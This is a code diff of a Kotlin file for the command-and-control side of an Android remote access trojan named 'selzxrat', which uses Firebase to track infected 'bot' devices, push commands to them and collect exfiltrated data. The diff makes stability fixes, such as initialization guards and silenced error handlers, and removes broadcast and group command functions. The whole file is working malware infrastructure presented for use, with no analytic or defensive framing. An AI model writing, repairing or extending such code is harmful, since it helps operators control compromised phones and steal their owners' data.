@@ -1,16 +1,13 @@
 package com.selzxrat.v5
 
-import android.content.Context
 import android.util.Log
 import com.google.firebase.database.*
 import com.google.firebase.storage.FirebaseStorage
 import com.google.firebase.storage.StorageReference
-import kotlinx.coroutines.*
-import kotlinx.coroutines.tasks.await
-import java.io.File
 import java.text.SimpleDateFormat
 import java.util.*
 
+// Data Classes
 data class BotInfo(
     val deviceId: String = "",
     val deviceName: String = "",
@@ -67,6 +64,7 @@ object C2Manager {
     private lateinit var broadcastRef: DatabaseReference
     private lateinit var groupsRef: DatabaseReference
 
+    // Callbacks
     private var _onBotUpdate: ((String, BotInfo) -> Unit)? = null
     private var _onCommandReceived: ((C2Command) -> Unit)? = null
     private var _onExfilReceived: ((ExfiltratedData) -> Unit)? = null
@@ -77,6 +75,7 @@ object C2Manager {
     private var commandListener: ValueEventListener? = null
     private var exfilListener: ValueEventListener? = null
 
+    // Register Callbacks
     fun onBotUpdate(callback: (String, BotInfo) -> Unit) { _onBotUpdate = callback }
     fun onCommandReceived(callback: (C2Command) -> Unit) { _onCommandReceived = callback }
     fun onExfilReceived(callback: (ExfiltratedData) -> Unit) { _onExfilReceived = callback }
@@ -84,6 +83,9 @@ object C2Manager {
     fun onConnectionError(callback: (String) -> Unit) { _onConnectionError = callback }
 
     fun initialize() {
+        // PERBAIKAN: Cek apakah sudah diinisialisasi untuk mencegah crash
+        if (::database.isInitialized) return 
+
         try {
             database = FirebaseDatabase.getInstance(FIREBASE_URL)
             database.setPersistenceEnabled(true)
@@ -95,21 +97,23 @@ object C2Manager {
             Log.d(TAG, "C2Manager initialized successfully")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to initialize C2Manager: ${e.message}")
-            _onConnectionError?.invoke("Init error: ${e.message}")
         }
     }
 
     fun startListening() {
+        if (!::botsRef.isInitialized) return // Safety check
         listenForBots()
         listenForCommands()
         listenForExfil()
     }
 
     fun stopListening() {
-        botListeners.values.forEach { botsRef.removeEventListener(it) }
-        botListeners.clear()
-        commandListener?.let { commandsRef.removeEventListener(it) }
-        exfilListener?.let { exfilRef.removeEventListener(it) }
+        if (::botsRef.isInitialized) {
+            botListeners.values.forEach { botsRef.removeEventListener(it) }
+            botListeners.clear()
+        }
+        if (::commandsRef.isInitialized) commandListener?.let { commandsRef.removeEventListener(it) }
+        if (::exfilRef.isInitialized) exfilListener?.let { exfilRef.removeEventListener(it) }
     }
 
     private fun listenForBots() {
@@ -130,9 +134,7 @@ object C2Manager {
             }
 
             override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
-            override fun onCancelled(error: DatabaseError) {
-                _onConnectionError?.invoke("Bots listener cancelled: ${error.message}")
-            }
+            override fun onCancelled(error: DatabaseError) {}
         })
     }
 
@@ -143,7 +145,6 @@ object C2Manager {
                 val bot = snapshot.getValue(BotInfo::class.java) ?: return
                 _onBotUpdate?.invoke(deviceId, bot)
             }
-
             override fun onCancelled(error: DatabaseError) {}
         }
         botsRef.child(deviceId).addValueEventListener(listener)
@@ -158,10 +159,7 @@ object C2Manager {
                     _onCommandReceived?.invoke(cmd)
                 }
             }
-
-            override fun onCancelled(error: DatabaseError) {
-                _onConnectionError?.invoke("Commands listener cancelled: ${error.message}")
-            }
+            override fun onCancelled(error: DatabaseError) {}
         }
         commandsRef.addValueEventListener(commandListener!!)
     }
@@ -174,54 +172,15 @@ object C2Manager {
                     _onExfilReceived?.invoke(data)
                 }
             }
-
-            override fun onCancelled(error: DatabaseError) {
-                _onConnectionError?.invoke("Exfil listener cancelled: ${error.message}")
-            }
+            override fun onCancelled(error: DatabaseError) {}
         }
         exfilRef.addValueEventListener(exfilListener!!)
     }
 
     fun sendCommand(botId: String, type: String, payload: String = "") {
         val cmdId = commandsRef.push().key ?: return
-        val cmd = C2Command(
-            cmdId = cmdId,
-            type = type,
-            payload = payload,
-            timestamp = System.currentTimeMillis(),
-            status = "pending"
-        )
-        commandsRef.child(cmdId).setValue(cmd).addOnCompleteListener { task ->
-            if (task.isSuccessful) {
-                Log.d(TAG, "Command sent: $type to $botId")
-            } else {
-                _onConnectionError?.invoke("Failed to send command: ${task.exception?.message}")
-            }
-        }
-    }
-
-    fun broadcastCommand(type: String, payload: String = "") {
-        val cmdId = broadcastRef.push().key ?: return
-        val cmd = C2Command(
-            cmdId = cmdId,
-            type = type,
-            payload = payload,
-            timestamp = System.currentTimeMillis(),
-            status = "broadcast"
-        )
-        broadcastRef.child(cmdId).setValue(cmd)
-    }
-
-    fun sendCommandToGroup(groupId: String, type: String, payload: String = "") {
-        val cmdId = groupsRef.child(groupId).child("commands").push().key ?: return
-        val cmd = C2Command(
-            cmdId = cmdId,
-            type = type,
-            payload = payload,
-            timestamp = System.currentTimeMillis(),
-            status = "group"
-        )
-        groupsRef.child(groupId).child("commands").child(cmdId).setValue(cmd)
+        val cmd = C2Command(cmdId, type, payload, System.currentTimeMillis(), "pending")
+        commandsRef.child(cmdId).setValue(cmd)
     }
 
     fun removeBot(deviceId: String) {
@@ -234,13 +193,9 @@ object C2Manager {
         botsRef.get().addOnSuccessListener { snapshot ->
             val bots = mutableMapOf<String, BotInfo>()
             for (child in snapshot.children) {
-                child.getValue(BotInfo::class.java)?.let { bot ->
-                    bots[child.key ?: ""] = bot
-                }
+                child.getValue(BotInfo::class.java)?.let { bots[child.key ?: ""] = it }
             }
             callback(bots)
-        }.addOnFailureListener {
-            _onConnectionError?.invoke("Failed to get bots: ${it.message}")
         }
     }
 
@@ -254,25 +209,7 @@ object C2Manager {
         }
     }
 
-    fun clearExfiltratedData() {
-        exfilRef.removeValue()
-    }
-
-    fun getStorageRef(): StorageReference {
-        return FirebaseStorage.getInstance().reference
-    }
-
     fun getCurrentTimestamp(): String {
-        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
-        return sdf.format(Date())
+        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
     }
-
-    fun destroy() {
-        stopListening()
-        _onBotUpdate = null
-        _onCommandReceived = null
-        _onExfilReceived = null
-        _onBotDisconnected = null
-        _onConnectionError = null
-    }
-                  }
+}
